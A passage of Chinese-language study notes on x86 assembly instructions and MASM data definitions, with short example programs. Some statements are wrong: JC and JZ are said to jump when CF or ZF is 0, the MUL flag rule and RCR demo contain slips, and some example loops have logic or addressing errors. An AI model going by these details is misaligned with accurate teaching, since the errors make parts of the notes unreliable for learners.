标志位的所有其他标志位</strong>。</p><h3 id="减法指令">减法指令</h3><p><code>SUB</code> 指令和 <code>ADD</code> 指令是类似的；<code>SBB</code> 和 <code>ADC</code> 是对应的，全称是 Subtract with Borrow，也就是需要多减去进位（借位）标志，也就是 CF 标志。</p><p><code>NEG OPRD</code> 指令则是对操作数取负数，相当于用 0 减去它。实际操作是按位取反+1。同样的，操作数必须是来自内存或者寄存器。它会影响常用的 6 个标志寄存器，课程只关心 CF 和 OF：</p><ul><li>只有当操作数为 0 时，CF 才为 0，其他为 1。</li><li>当操作数为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><msup><mn>2</mn><mn>7</mn></msup></mrow><annotation encoding="application/x-tex">-2^7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span></span></span></span> 或者 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><msup><mn>2</mn><mn>15</mn></msup></mrow><annotation encoding="application/x-tex">-2^{15}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">15</span></span></span></span></span></span></span></span></span></span></span></span> 或者 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup></mrow><annotation encoding="application/x-tex">-2^{31}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span></span></span></span> 时，结果时操作数本身，OF 为 1。其他情况 OF 为 0.</li></ul><p><code>CMP OPRD1，OPRD2</code> 指令<strong>不更改操作数，只按照 <code>OPRD1-OPRD2</code> 影响所有标志位</strong>，它的作用是根据标志位判断大小关系。但是它的操作数和 ADD 指令一样，<strong>OPRD1 必须是可以写入的，而且两个操作数不能全来自内存</strong>。具体来说</p><p>对于无符号数 <code>CMP AX BX</code>，用 CF、ZF 判断：</p><ul><li><p>若 AX &gt; BX，则 CF=0, ZF=0</p></li><li><p>若 AX &lt; BX，则 CF=1, ZF=0</p></li><li><p>若 AX = BX，则 ZF=1</p></li></ul><p>对于有符号数，用 SF、OF、ZF 判断：</p><ul><li>若 AX &gt; BX，则 OF=SF,ZF=0</li><li>若 AX &lt; BX，则 OF≠SF,ZF=0</li><li>若 AX=BX，则 ZF=1</li></ul><p>一般的用法，比如在后面接跳转指令。<strong>JG</strong>(Jump if Greater) 指令表示有符号数“大于”跳转，当 OF=SF,ZF=0 时，跳转。<strong>JA</strong>(Jump if Above) 指令表示“大于（无符号数）”跳转，当 CF=0, ZF=0 时，跳转。</p><p>例题：在 20 个从 BUF 开始的无符号数中，找出最大的数，并将其存放在 MAX 单元中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    LEA EBX MAX</span><br><span class="line">    LEA ESI BUF</span><br><span class="line">    MOV CL, 19</span><br><span class="line">    MOV EAX, [ESI]</span><br><span class="line">NEXT:</span><br><span class="line">INC ESI</span><br><span class="line">CMP EAX, [ESI]</span><br><span class="line">    JB ASSIGN;如果EAX的数比较小</span><br><span class="line">CONTINUE:</span><br><span class="line">DEC CL</span><br><span class="line">    JNZ NEXT;继续循环</span><br><span class="line">    MOV [EBX], EAX；循环结束</span><br><span class="line">    HLT</span><br><span class="line"></span><br><span class="line">ASSIGN:</span><br><span class="line">MOV EAX, [ESI]</span><br><span class="line">INC ESI</span><br><span class="line">JMP CONTINUE</span><br></pre></td></tr></table></figure><h3 id="乘法指令">乘法指令</h3><p><code>MUL OPRD</code> 是无符号乘法，其中操作数只能来自寄存器或者内存。表达的意思是，将 <code>OPRD</code> 乘以</p><ul><li>AL，存入 AX</li><li>AX，存入 DX:AX</li><li>EAX，存入 EDX:EAX</li></ul><p>也就是说，运算结果是操作数的两倍，隐藏的操作数由 <code>OPRD</code> 决定。<strong>标志位的影响也比较特殊，只关注 CF 和 OF 标志</strong>，如果隐藏的操作数存不下，需要 AH 或 DX 或者 EDX 存储结果时，CF=1,OF=1。否则 CF=0,ZF=0。</p><p><code>IMUL OPRD</code> 的用法完全一样，只是把操作数当作有符号整数。但是由于带符号数都会进行符号扩展，所以判断有些复杂。</p><p><strong>增加判断的例题！！！！！！</strong></p><p>32 位下，<code>IMUL</code> 指令增加了操作数的形式。</p><ul><li><code>IMUL DEST, SRC </code> 表示 <code>DEST&lt;=(DEST)×(SRC)</code></li><li><code> IMUL DEST, SRC1, SRC2</code> 表示 <code>DEST&lt;=(SRC1) ×(SRC2) </code>。</li></ul><h3 id="除法指令">除法指令</h3><p>除法指令中只给出除数，而被除数和商、余数都为隐含。存储的位置和乘法是对应的。因为被除数长度必须是除数长度的两倍，因此常常需要和扩展指令 <code>CBW</code> <code>CWD</code> <code>CDQ</code> 配合使用。</p><table><thead><tr><th><strong>被除数</strong></th><th><strong>除数</strong></th><th><strong>商</strong></th><th><strong>余数</strong></th></tr></thead><tbody><tr><td>AX</td><td>reg8/mem8</td><td>AL</td><td>AH</td></tr><tr><td>DX:AX</td><td>reg16/mem16</td><td>AX</td><td>DX</td></tr><tr><td>EDX:EAX</td><td>reg32/mem32</td><td>EAX</td><td>EDX</td></tr></tbody></table><p>拓展指令是<strong>零操作数指令，隐含的地址为 AX, DX,EAX,EDX</strong>。</p><p>CBW(Convert Byte to Word) 表示字节拓展到字，也就是说</p><ul><li>若 AL 最高位=1，则执行后 AH=FFH</li><li>若 AL 最高位=0，则执行后 AH=00H</li></ul><p>CWD(Convert Word to Doubleword) 也是完全类似的：</p><ul><li>若 AX 最高位=1，则执行后 DX=FFFFH</li><li>若 AX 最高位=0，则执行后 DX=0000H</li></ul><p>CDQ(Convert Doubleword to Quadword) 表示双字拓展成四字，只是从 DX 变成了 EDX。</p><h3 id="BCD-码调整指令">BCD 码调整指令</h3><p>BCD 码调整指令是一组用于将二进制码转换为二进制编码十进制（BCD）码的指令。BCD 码是一种用于表示十进制数的二进制编码形式，使用四位二进制数表示一位十进制数。</p><p>BCD 码分为压缩型和非压缩型，压缩型一个字节表示 2 个 BCD 码，比如 0010 0011 表示十进制的 23。</p><img src="http://cdn.blog-blockchain.xyz/202304261102698.png" alt="image-20230426110208453" style="zoom:67%;" /><p>非压缩型只看一个字节的低四位表示的 BCD 码，忽略高 4 位，常为 0000 或 0011。比如 0000 1001 与 0011 1001 都是十进制数 9 的非压缩型 BCD 码</p><img src="http://cdn.blog-blockchain.xyz/202304261103594.png" alt="image-20230426110350424" style="zoom:67%;" /><p>BCD 码的运算过程可以将转化成二进制运算，然后再把二进制的结果转化成 BCD 码。但是这样效率比较低，8086 使用的是直接使用 BCD 码参与二进制运算，然后用指令将结果校正成 BCD 码。</p><p>这里我们了解一下即可，记住指令和全称表达的意思。</p><ol><li>DAA（Decimal Adjust AL after Addition）：用于在将两个<strong>十进制数</strong>相加后，调整 AL 中存储的 BCD 码结果。</li><li>AAA（ASCII Adjust AL after Addition）：用于在将两个<strong>ASCII 码数</strong>相加后，调整 AL 中存储的二进制码结果。</li><li>DAS（Decimal Adjust AL after Subtraction）：用于在将两个十进制数相减后，调整 AL 中存储的 BCD 码结果。</li><li>AAS（ASCII Adjust AL after Subtraction）：用于在将两个 ASCII 码数相减后，调整 AL 中存储的二进制码结果。</li><li>AAM（ASCII Adjust AX after Multiply）：用于在将两个 ASCII 码数相乘后，调整 AX 中存储的二进制码结果，将其转换为两个十进制数的积。</li><li>AAD（ASCII Adjust AX before Division）：用于在将两个 ASCII 码数相除前，将 AX 中存储的二进制码结果转换为两个十进制数的商和余数。</li></ol><h2 id="逻辑运算">逻辑运算</h2><p><code>NOT</code> 指令<strong>不会影响标志位</strong>，但是其他逻辑运算指令都会使<strong>OF=CF=0</strong>，SF ZF PF 根据结果确定。<code>AND</code> <code>OR</code> <code>XOR</code> 都是逻辑指令，<code>TEST</code> 则特殊，只是修改标志位不实际写入目标位置。</p><p>例如：从地址为 3F8H 端口中读入一个字节数，如果该数 bit1 位为 1，则将 DATA 为首地址的一个字输出到 38FH 端口，否则就不能进行数据传送。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LEA ESI, DATA</span><br><span class="line">MOV DX, 3F8H</span><br><span class="line">WAIT:</span><br><span class="line">IN AL, DX</span><br><span class="line">AND AL, 02H</span><br><span class="line">JZ WAIT</span><br><span class="line"></span><br><span class="line">MOV DX, 38FH</span><br><span class="line">MOV AX, [ESI]</span><br><span class="line">OUT DX, AX</span><br></pre></td></tr></table></figure><p>例如：将一个 8 位二进制数 9 变为字符‘9’（57=39H=0011 1001B），9=1001H，所以 <code>OR  AL '9'</code> 这样就可以实现。</p><p>例如：从地址为 3F8H 的端口中读入一个字节数，当该数的 bit1， bit3， bit5 位同时为 1 时，则从 38FH 端口将 DATA 为首地址的一个字输出，否则就从端口重新输入。</p><p>分析可以知道，AND 0010 1010B，如果结果是这个数，那么就符合要求。这就要使用到减法指令中的 <code>CMP</code>，对应的有符号数大于用 <code>JG</code>，无符号数 <code>JA</code>，相等都是 <code>JZ</code>。另外一种办法是，AND 之后看结果是否 3 个 1 都有，可以用 <code>XOR</code> 实现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LEA ESI, DATA</span><br><span class="line">MOV DX, 38FH</span><br><span class="line">WAIT:</span><br><span class="line">IN AL, DX</span><br><span class="line">CMP AL, 2AH</span><br><span class="line">JZ WAIT</span><br><span class="line"></span><br><span class="line">MOV DX, 38FH</span><br><span class="line">MOV AX, [ESI]</span><br><span class="line">OUT DX, AX</span><br></pre></td></tr></table></figure><h2 id="移位指令">移位指令</h2><p>移位的标志位一般只考虑 CF，<strong>CF 标志是这次操作移出的那一位</strong></p><p>移位指令的次数，<strong>只能由 CL 或者 8 位立即数指定</strong>。<code>SAL  OPRD，CL/imm8</code> (Shift Arithmetic Left)一般用于带符号数，右边补 0，注意<strong>左移在小端序中实际是向高地址方向移动，在大端序中是向低地址移动</strong>。<code>SHL</code>(Shift Logical Left)实际上也是相同的。</p><p>对应的，右移也分为 <code>SAR</code> 和 <code>SHR</code>，分别用于带符号数和无符号数。</p><p>也有循环移位指令，对标志位修改和其他移位指令一样，但是 <code>ROL</code>（Rotate Left） <code>ROR</code>（Rotate Right） 指令是不带进位的循环移位，相当于操作数转圈。<code>RCL</code> <code>RCR</code> 则是把 CF 也作为数字的一部分，开始移位。比如 <code>0100 1101</code> ,初始 CF=1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">如果是ROR:</span><br><span class="line">ROR：`0010 0110` CF=1</span><br><span class="line">ROR: `0001 0011`，CF=0</span><br><span class="line">如果是RCR:</span><br><span class="line">ROR：`1010 0110` CF=1</span><br><span class="line">ROR: `1101 0011`，CF=0</span><br></pre></td></tr></table></figure><h2 id="串操作指令">串操作指令</h2><p>串操作实际上就是循环处理，但是自动修改 ESI 和(或)EDI，使其指向下一个单元。注意，DF=0 则地址增加，DF=1 则地址减小。循环计数的寄存器 ECX 也会对应减少。这样的操作，会通过「重复前缀」实现，前缀的意思就是它放在其他指令的前面，修饰这条指令，在满足条件下重复指令。<strong>重复前缀修改 ECX 不修改标志位</strong>。</p><ul><li>REP: ECX 不为 0 就重复。</li><li>REPE 和 REPZ：则是增加了条件 ZF=1，才重复。分别用于判断字符串相等和字符串为 0.</li></ul><p><strong>MOVS 这类指令可以使用 MOVSB、MOVSW、MOVSD，这样指定长度就不需要操作数，默认了操作数来源。同理，CMPS、SCAS 也是这样</strong></p><p>例子：用 MOVS 指令实现将 200 个字节数据从 MEM1 开始的一个内存区送到另一个从 MEM2 开始的区域的程序段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LEA  ESI，MEM1</span><br><span class="line">LEA  EDI，MEM2</span><br><span class="line">MOV  ECX，200</span><br><span class="line">CLD</span><br><span class="line">REP  MOVSB</span><br><span class="line">HLT</span><br></pre></td></tr></table></figure><p>例子：比较两组(200 个字节)对应数据，找出第一个不同数据放入 AL，其地址放入 EBX。<code>CMPS</code> 相当于 字符串相减<code>src - dst</code>，影响标志位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LEA  ESI，MEM1</span><br><span class="line">LEA  EDI，MEM2</span><br><span class="line">MOV  ECX，200</span><br><span class="line">CLD</span><br><span class="line">REPE CMPSB ;在ECX不为零且[ESI]等于[EDI]的情况下，重复执行以下操作：比较[ESI]和[EDI]指向的字节，递增ESI和EDI，递减ECX。</span><br><span class="line">JZ  STOP</span><br><span class="line">DEC  ESI</span><br><span class="line">MOV  AL，[ESI]</span><br><span class="line">MOV  EBX，ESI</span><br><span class="line">STOP：HLT</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>例子：<code>SCAS</code>（Scan String Byte） 则是根据长度和 AL/AX/EAX - [EDI]，32 位下时双字。只影响标志位。在内存块中搜索特定的字节值（在本例中为 0x42）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">; 初始化寄存器</span><br><span class="line">MOV EDI, OFFSET MemoryBlock ; 设置EDI指向内存块的起始位置</span><br><span class="line">MOV ECX, 1000               ; 设置要搜索的字节数（1000字节）</span><br><span class="line">MOV AL, 0x42                ; 设置要查找的值（0x42）</span><br><span class="line">CLD                         ; 清除DF标志，使EDI递增</span><br><span class="line"></span><br><span class="line">; 使用REPNE和SCASB指令进行搜索</span><br><span class="line">REPNE SCASB</span><br><span class="line"></span><br><span class="line">; 检查搜索结果</span><br><span class="line">JNE NotFound                ; 如果ZF=0，表示没有找到目标值，跳转到NotFound标签</span><br><span class="line">DEC EDI                      ; 如果找到目标值，将EDI减1以获取正确的内存地址</span><br><span class="line"></span><br><span class="line">; 在此处处理找到的值，EDI指向找到的值的内存地址</span><br><span class="line">; ...</span><br><span class="line"></span><br><span class="line">NotFound:</span><br><span class="line">; 在此处处理未找到目标值的情况</span><br><span class="line">; ...</span><br><span class="line"></span><br><span class="line">MemoryBlock:</span><br><span class="line">DB 0x11, 0x22, 0x33, 0x42, 0x55, 0x66, 0x77, 0x88, 0x99 ; 内存块数据</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>LODS</code>（Load String）指令从[ESI]加载字符串到 AL、AX、EAX，显然<strong>LODS 指令加重复前缀无意义。</strong></p><p><code>STOS</code>（Store String）则是相反的，从 AL、AX、EAX 加载字符串到[EDI]。</p><p>例如：将累加器中的值（假设为<code>AL</code>）存储到目标地址为<code>destination</code>的字符串中，共存储<code>length</code>次：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MOV ECX, length     ; 设置要存储的次数</span><br><span class="line">MOV EDI, destination ; 设置目标字符串的起始地址</span><br><span class="line">MOV AL, value       ; 设置要存储的值</span><br><span class="line">CLD                 ; 清除方向标志，使 DI 递增</span><br><span class="line">REP STOSB           ; 重复执行 STOSB，直到存储了 length 个值</span><br></pre></td></tr></table></figure><h2 id="程序控制指令">程序控制指令</h2><p>转移指令主要由下面几种：</p><ul><li>JMP OPRD：它是无条件转移，从下一条指令开始计算偏移量。实际使用可以 <code>JMP Label</code> 即可。但是如果是 <code>JMP EBX</code> 这样 32 位的数据，就是直接跳转到 EBX 的位置。</li></ul><p>标志位：</p><ul><li>JC：CF 为 0 跳转。</li><li>JZ：ZF 为 0 跳转。</li><li>JO：OF</li><li>JP：PF</li></ul><p>比较类：</p><ul><li>JA、JB、JAE、JBE：是无符号数，接在 CMP 后面。</li><li>JG、JL：是有符号数，也是 CMP 后面。</li></ul><p>CX/ECX：</p><ul><li>JCXZ、JECXZ：根据 CX、ECX 跳转。</li></ul><p>例题：统计内存数据段中以 TABLE 为首地址的 100 个 8 位有符号数中正数、负数和零的个数。LOOP 是自动 ECX-1 得控制流指令，ECX=0 是退出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">.DATA</span><br><span class="line">TABLE   DB   100 DUP (?) ; 100个8位有符号数（您需要手动设置这些数值）</span><br><span class="line">posCount    DD   0 ; 正数计数器</span><br><span class="line">negCount    DD   0 ; 负数计数器</span><br><span class="line">zeroCount   DD   0 ; 零计数器</span><br><span class="line"></span><br><span class="line">.CODE</span><br><span class="line">main PROC</span><br><span class="line">    ; 设置计数器</span><br><span class="line">    MOV ECX, 100</span><br><span class="line"></span><br><span class="line">    ; 设置源字符串的起始地址</span><br><span class="line">    LEA ESI, TABLE</span><br><span class="line"></span><br><span class="line">    ; 清除方向标志，使 ESI 递增</span><br><span class="line">    CLD</span><br><span class="line"></span><br><span class="line">CountLoop:</span><br><span class="line">    ; 加载下一个字节</span><br><span class="line">    LODSB</span><br><span class="line"></span><br><span class="line">    ; 检查零</span><br><span class="line">    OR AL, AL</span><br><span class="line">    JZ ZeroFound</span><br><span class="line"></span><br><span class="line">    ; 检查正数</span><br><span class="line">    JS NegativeFound</span><br><span class="line">    ; 如果是正数</span><br><span class="line">    ADD DWORD PTR posCount, 1</span><br><span class="line">    JMP ContinueLoop</span><br><span class="line"></span><br><span class="line">NegativeFound:</span><br><span class="line">    ; 如果是负数</span><br><span class="line">    ADD DWORD PTR negCount, 1</span><br><span class="line">    JMP ContinueLoop</span><br><span class="line"></span><br><span class="line">ZeroFound:</span><br><span class="line">    ; 如果是零</span><br><span class="line">    ADD DWORD PTR zeroCount, 1</span><br><span class="line"></span><br><span class="line">ContinueLoop:</span><br><span class="line">    ; 继续循环</span><br><span class="line">    LOOP CountLoop</span><br><span class="line"></span><br><span class="line">    ; ... 其他代码 ...</span><br><span class="line">    ; 程序结束</span><br><span class="line">    ret</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><h2 id="过程调用">过程调用</h2><p>flat 模式下过程调用是 EIP 压栈，然后入口送入 EIP 中。子过程执行之后 RET 返回原程序</p><h1>汇编程序基础</h1><p>在汇编中，指令的基本格式如下，标号就之前 <code>NEXT</code> 这样的东西，用来表示这个语句的位置，注意不要和保留字冲突。指令助记符就是指令名字，操作数表示可以多次出现，注释也可以多次出现。</p><img src="http://cdn.blog-blockchain.xyz/202305102346732.png" alt="image-20230510234620668" style="zoom:50%;" /><p>除了之前学过的指令还有伪指令，它们不是 CPU 可以直接执行的指令，而是为了方便编写程序的一些指令，编译器或者汇编器会进行处理，按照伪指令的逻辑，生成代码。一些常见的伪指令示例包括：</p><ul><li><code>DB</code>：定义一个或多个字节的数据。</li><li><code>DW</code>：定义一个或多个字的数据。</li><li><code>DD</code>：定义一个或多个双字的数据。</li><li><code>EQU</code>：为一个值或地址分配一个符号名称。</li><li><code>END</code>：标记程序的结束。</li></ul><p>还有多行注释，<code>@</code> 是自定义符号，注释中不能出现，否则会造成矛盾。：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">COMMENT @</span><br><span class="line">这是多行注释。</span><br><span class="line">@</span><br></pre></td></tr></table></figure><h2 id="数据定义">数据定义</h2><p>汇编中的字面常量，数字一般是十进制，<code>1101B</code> <code>aef4H</code> 这些根据后缀指定二进制或者十六进制。字符串是用单引号和双引号都可以，字符用单引号，都是 ASCII 码表示。</p><p>变量会定义数据的类型，主要是指变量的长度。一般用缩写即可，都是 <code>Define Byte/Word/Doubleword</code>，对应<code>DB/DW/DD</code>。变量一般会放在数据区，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.DATA</span><br><span class="line">DATA1    BYTE   12H</span><br><span class="line">DATA2    DB      20H,30H</span><br><span class="line">DATA3    WORD    5678H</span><br><span class="line">DATA4  DB ?,?,?</span><br><span class="line">DATA5DB &quot;abcdse&quot;</span><br></pre></td></tr></table></figure><img src="http://cdn.blog-blockchain.xyz/202305110026190.png" alt="Untitled" style="zoom: 60%;" /><p>变量名表示在数据区（段）内的偏移量，比如 <code>DATA1</code> 表示 0。一个变量也可以表示一个数组，比如 <code>20H,30H</code> 用逗号分隔，表示两个字节元素的数组。如果是 <code>?</code> 表示不初始化。字符串会自动解析成对应类型。</p><p>关于字符串的字面常量，需要注意除了 byte 类型，元素长度必须不大于类型长度，而且内存布局是小端序。如果元素比较短，那么高位自动填充 0。比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DATA1DB &quot;abcdse&quot;</span><br><span class="line">; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;s&#x27; &#x27;e&#x27;</span><br><span class="line">DARA2 DW &quot;abcds&quot;;报错，元素长度不匹配。</span><br><span class="line">DARA3 DW &quot;abc&quot;,&quot;ds&quot;;报错，&quot;abc&quot;超过了一个字。</span><br><span class="line">DARA3 DW &quot;ab&quot;,&quot;cd&quot;,&quot;s&quot;</span><br><span class="line">;&#x27;b&#x27; &#x27;a&#x27; &#x27;d&#x27; &#x27;c&#x27; &#x27;e&#x27; s &#x27;0&#x27;</span><br><span class="line">DARA3 DD &quot;abcd&quot;</span><br><span class="line">;&#x27;d&#x27; &#x27;c&#x27; &#x27;b&#x27; &#x27;a&#x27;</span><br></pre></td></tr></table></figure><p>为了方便创建数组，甚至复杂的数据，提出了 <code>DUP</code> 伪指令，注意<code>重复次数+DUP(元素字面量)</code> 是一组的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;基本语法：变量名+类型+重复次数+DUP(需要重复的元素的字面量)</span><br><span class="line">DATA1  DB   10H  DUP(?);重复了10H个未初始化的字节。</span><br><span class="line">DATA_B  DB   20H  DUP(‘AB’);重复20H个 &quot;AB&quot;</span><br><span class="line"></span><br><span class="line">;4 DUP(2)表示 2,2,2,2然后一起组成 10H DUP(2,2,2,2,7),</span><br><span class="line">DATA_C   DB   10H  DUP(4  DUP(2),7)</span><br></pre></td></tr></table></figure><p>局部变量在子程序中定义，默认 <code>dword</code> 类型，基本语法<code>local 变量名[元素个数] :类型</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Local var1[1024]:byte ;定义了一个1024字节长的局部变量lvar1</span><br><span class="line">Local var3,var4:byte ;定义了dword型局部变量var3,byte型局部变量var4</span><br></pre></td></tr></table></figure><p>使用变量时，变量表示地址，但是直接引用变量，是提取地址里面的内容。变量也可以相对寻址，写入特定的位置，比如 <code>MOV  DA3[ESI]，AL</code>。特别是在 <code>MOV</code> 指令中，赋值长度一般由寄存器决定。</p><h2 id="标号和符号定义">标号和符号定义</h2><p>给语句的标号，实际上有一些属性。当使用 <code>::</code> 而不是 <code>:</code> 时表示全局标号。而且放在指令前面是，是 <code>NEAR</code> 类型标号，只能段内转移，段外要调用，要用 <code>标号名字 NEAR FAR</code>，而且不用冒号，下一条指令换行写。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SUB1_FAR    LABEL    FAR</span><br><span class="line">SUB1:  MOV  AX,30H</span><br></pre></td></tr></table></figure><p>而且标号可以设置别名，改变变量属性。使用 <code>DATA_BYTE</code> 就可以把下面的 <code>DATA_WORD</code> 变量当作 byte 类型用了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DATA_BYTE   LABEL  BYTE</span><br><span class="line">DATA_WORD  DW  20H  DUP(?)</span><br></pre></td></tr></table></figure><p><code>EQU</code> 伪指令相当于宏定义，编译时直接替换，所以指代必须唯一。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">COUNT  EQU  5</span><br><span class="line">STR1 EQU “ABCD”</span><br><span class="line">CBD     EQU  DAA; 指令别名</span><br><span class="line">CREG  EQU  CX;CREG等价与CX</span><br><span class="line">NUM    EQU  COUNT+5</span><br><span class="line">ADR1  EQU  DS:[EBP+14];在DS数据段中以BP作基址寻址的一个存储单元。</span><br></pre></td></tr></table></figure><p><code>=</code> 类似 EQU，但是只能是一些字面量的别名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CONT=5</span><br><span class="line">NUM=14H</span><br><span class="line">NUM=NUM+10H</span><br></pre></td></tr></table></figure><h2 id="表达式和变量修饰符">表达式和变量修饰符</h2><p><code>+、—、＊、 / 、MOD、SHL、SHR、[ ]</code> 这些表达式时汇编器自己定义的，也会由汇编器编译成字节码，用于方便编程程序。需要注意，<code>SHR</code> <code>SHL</code> 